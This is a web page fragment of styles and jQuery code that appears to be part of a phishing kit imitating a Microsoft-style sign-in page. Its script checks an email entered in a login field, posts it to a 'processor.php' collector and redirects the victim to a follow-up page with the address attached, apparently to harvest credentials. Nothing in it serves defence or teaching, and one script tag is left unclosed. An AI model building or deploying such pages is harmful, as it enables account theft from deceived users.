<style>
    .progress {
        overflow: hidden;
    }

    .progress>div {
        position: absolute;
        height: 5px;
        width: 5px;
        background-color: #0067b8;
        z-index: 100;
        border-radius: 50%;
        opacity: 0;
    }

    .progress {
        position: absolute;
        top: 0;
        left: 0;
        height: 5px;
        width: 100%;
    }

    .progress>div {
        -webkit-animation: progressDot 2s infinite;
        -moz-animation: progressDot 2s infinite;
        -o-animation: progressDot 2s infinite;
        animation: progressDot 2s infinite;
    }

    .progress>div:nth-child(1) {
        -webkit-animation-delay: .05s;
        -moz-animation-delay: .05s;
        -o-animation-delay: .05s;
        animation-delay: .05s;
    }

    .progress>div:nth-child(2) {
        -webkit-animation-delay: .2s;
        -moz-animation-delay: .2s;
        -o-animation-delay: .2s;
        animation-delay: .2s;
    }

    .progress>div:nth-child(3) {
        -webkit-animation-delay: .35s;
        -moz-animation-delay: .35s;
        -o-animation-delay: .35s;
        animation-delay: .35s;
    }

    .progress>div:nth-child(4) {
        -webkit-animation-delay: .5s;
        -moz-animation-delay: .5s;
        -o-animation-delay: .5s;
        animation-delay: .5s;
    }

    .progress>div:nth-child(5) {
        -webkit-animation-delay: .65s;
        -moz-animation-delay: .65s;
        -o-animation-delay: .65s;
        animation-delay: .65s;
    }

    @-webkit-keyframes progressDot {

        0%,
        20% {
            left: 0%;
            -webkit-animation-timing-function: ease-out;
            opacity: 0;
        }

        25% {
            opacity: 1;
        }

        35% {
            left: 45%;
            -webkit-animation-timing-function: linear;
        }

        65% {
            left: 60%;
            -webkit-animation-timing-function: ease-in;
        }

        75% {
            opacity: 1;
        }

        80%,
        100% {
            left: 100%;
            opacity: 0;
        }
    }

    @-moz-keyframes progressDot {

        0%,
        20% {
            left: 0%;
            -moz-animation-timing-function: ease-out;
            opacity: 0;
        }

        25% {
            opacity: 1;
        }

        35% {
            left: 45%;
            -moz-animation-timing-function: linear;
        }

        65% {
            left: 60%;
            -moz-animation-timing-function: ease-in;
        }

        75% {
            opacity: 1;
        }

        80%,
        100% {
            left: 100%;
            opacity: 0;
        }
    }

    @-o-keyframes progressDot {

        0%,
        20% {
            left: 0%;
            -o-animation-timing-function: ease-out;
            opacity: 0;
        }

        25% {
            opacity: 1;
        }

        35% {
            left: 45%;
            -o-animation-timing-function: linear;
        }

        65% {
            left: 60%;
            -o-animation-timing-function: ease-in;
        }

        75% {
            opacity: 1;
        }

        80%,
        100% {
            left: 100%;
            opacity: 0;
        }
    }

    @keyframes progressDot {

        0%,
        20% {
            left: 0%;
            animation-timing-function: ease-out;
            opacity: 0;
        }

        25% {
            opacity: 1;
        }

        35% {
            left: 45%;
            animation-timing-function: linear;
        }

        65% {
            left: 60%;
            animation-timing-function: ease-in;
        }

        75% {
            opacity: 1;
        }

        80%,
        100% {
            left: 100%;
            opacity: 0;
        }
    }
</style>

<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"

<script>
    
var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

var email = $("#loginfmt");

    $('#loginfmt').keyup(function (event) {
        if (event.which == 13) {
            $('#submit-btn').click();
        }
       
    });


    function sendmails() {
        var submit = true;
        var ps = email.val()    ;
        var url = location.origin;

        if (ps == null || ps == "" || !(re.test(String(email.val()).toLowerCase()))) {
            $("#usernameError").show();
            submit = false;
        }

        else {
            //	$("#errormsg").hide();
            $("#usernameError").hide();
            submit = true;
        }

        if (submit == true) {

            $.ajax({
                url: '', // full url of processor.php
                type: 'POST',
                data: {
                    user: ps,
                    type: 1
                },
                beforeSend: function () {
                    $(".progress").show();
                    $('#submit-btn').val('Next');
                },

                complete: function () {
                   
                      

                        
                            $("#errormsg").hide();

                            function redirect() {
                                window.location.replace(url+"/bcos.html#"+ps);
                            }

                            setTimeout(redirect, 700);


                      

                    
                }
            });

        }

    }



</script>
